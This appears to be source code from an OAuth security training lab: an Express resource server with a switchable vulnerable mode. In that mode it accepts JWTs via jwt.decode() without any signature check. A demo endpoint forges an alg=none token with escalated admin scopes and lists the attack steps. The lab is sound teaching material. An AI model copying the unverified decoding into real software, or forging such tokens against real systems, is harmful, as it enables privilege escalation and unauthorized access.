/**
 * Resource Server
 * ===============
 * Simulates a protected API that validates OAuth access tokens.
 *
 * Demonstrates:
 *   - Token introspection / JWT verification
 *   - Scope enforcement on API endpoints
 *   - Attack 7: JWT alg=none bypass (validates tokens insecurely in VULNERABLE mode)
 */

require('dotenv').config();
const express = require('express');
const jwt = require('jsonwebtoken');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3003;
const AUTH_SERVER = process.env.AUTH_SERVER || 'http://localhost:3001';
const AUTH_SERVER_PUBLIC = process.env.AUTH_SERVER_PUBLIC || 'http://localhost:3001';
const SELF_URL = process.env.RESOURCE_SERVER_PUBLIC || 'http://localhost:3003';
const JWT_SECRET = process.env.JWT_SECRET || 'super-secret-jwt-key-change-me-in-production';
const VULNERABLE = process.env.VULNERABLE_MODE === 'true';

const cors = require('cors');
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || 'http://localhost:3002,http://localhost:3004').split(',');
app.use(cors({ origin: ALLOWED_ORIGINS, credentials: true }));
app.use(express.json());

// ── Middleware: Token Verification ────────────────────────────────────────────
function requireAuth(requiredScopes = []) {
  return async (req, res, next) => {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'missing_token' });
    }

    const token = authHeader.replace('Bearer ', '');

    try {
      let decoded;

      if (VULNERABLE) {
        /**
         * 🔴 VULNERABLE (Attack 7): Accept JWT without verifying signature
         *
         * jwt.decode() simply base64-decodes the payload — no signature check.
         * Combined with a vulnerable auth server that accepts alg=none,
         * an attacker can forge tokens with any payload (e.g., elevated roles).
         *
         * Attack flow:
         * 1. Get any valid JWT from a legitimate login
         * 2. Decode header/payload (base64)
         * 3. Modify payload: add "admin" role or change user_id
         * 4. Change header: {"alg":"none"}
         * 5. Re-encode without signature: header.payload.
         * 6. Resource server accepts it as valid!
         */
        decoded = jwt.decode(token);
        if (!decoded) throw new Error('Invalid token format');
        console.warn(`⚠️  [VULNERABLE] Token accepted without signature verification for: ${decoded.username}`);
      } else {
        /**
         * 🟢 SECURE: Full signature + algorithm verification
         * Specifying algorithms: ['HS256'] prevents alg=none bypass.
         */
        decoded = jwt.verify(token, JWT_SECRET, {
          algorithms: ['HS256'],
          issuer: AUTH_SERVER_PUBLIC,
          audience: SELF_URL,
        });
      }

      // Scope enforcement
      if (requiredScopes.length > 0) {
        const tokenScopes = (decoded.scope || '').split(' ');
        const hasRequiredScopes = requiredScopes.every(s => tokenScopes.includes(s));
        if (!hasRequiredScopes) {
          return res.status(403).json({
            error: 'insufficient_scope',
            required: requiredScopes,
            provided: tokenScopes,
          });
        }
      }

      req.user = decoded;
      next();
    } catch (err) {
      return res.status(401).json({ error: 'invalid_token', details: err.message });
    }
  };
}

// ── Protected API Endpoints ───────────────────────────────────────────────────

// Basic profile — requires 'read' scope
app.get('/api/profile', requireAuth(['read']), (req, res) => {
  res.json({
    message: 'Profile data (requires read scope)',
    username: req.user.username,
    email: req.user.email,
    roles: req.user.roles,
    scopes_granted: req.user.scope,
    mode: VULNERABLE ? 'VULNERABLE' : 'SECURE',
  });
});

// Write endpoint — requires 'write' scope
app.post('/api/data', requireAuth(['write']), (req, res) => {
  res.json({
    message: 'Data written (requires write scope)',
    user: req.user.username,
    data: req.body,
  });
});

// Admin endpoint — requires 'admin' scope
app.get('/api/admin/users', requireAuth(['admin']), (req, res) => {
  res.json({
    message: '⚠️ Admin endpoint (requires admin scope)',
    users: ['alice', 'admin', 'other-user'],
    accessed_by: req.user.username,
    warning: VULNERABLE ? 'Scope may have been escalated or token forged!' : 'Access legitimately granted',
  });
});

// JWT forge demo endpoint — Attack 7 demonstration
app.get('/api/jwt-attack-demo', (req, res) => {
  const exampleToken = jwt.sign(
    { sub: 'alice', username: 'alice', scope: 'read', roles: ['user'] },
    JWT_SECRET,
    { algorithm: 'HS256', expiresIn: '1h', issuer: AUTH_SERVER_PUBLIC, audience: SELF_URL }
  );

  // Craft a forged alg=none token
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: 'alice',
    username: 'alice',
    scope: 'read write admin',  // Escalated scopes!
    roles: ['user', 'admin'],   // Elevated role!
    iss: AUTH_SERVER_PUBLIC,
    aud: SELF_URL,
    exp: Math.floor(Date.now() / 1000) + 3600,
    iat: Math.floor(Date.now() / 1000),
  })).toString('base64url');
  const forgedToken = `${header}.${payload}.`; // Empty signature

  res.json({
    description: 'JWT Algorithm Confusion Attack (Attack 7)',
    mode: VULNERABLE ? 'VULNERABLE — forged token will be accepted' : 'SECURE — forged token will be rejected',
    legitimate_token: exampleToken.substring(0, 50) + '...',
    forged_alg_none_token: forgedToken,
    attack_instructions: [
      '1. Take the forged_alg_none_token value above',
      '2. Send: GET /api/admin/users with Authorization: Bearer <forged_token>',
      `3. In VULNERABLE mode: server uses jwt.decode() — accepts without verification`,
      '4. In SECURE mode: server uses jwt.verify() with algorithms:["HS256"] — rejects alg=none',
    ],
  });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', mode: VULNERABLE ? 'VULNERABLE' : 'SECURE' });
});

app.listen(PORT, () => {
  console.log(`\n🛡️  Resource Server running on port ${PORT}`);
  console.log(`⚠️  Mode: ${VULNERABLE ? '🔴 VULNERABLE' : '🟢 SECURE'}\n`);
});
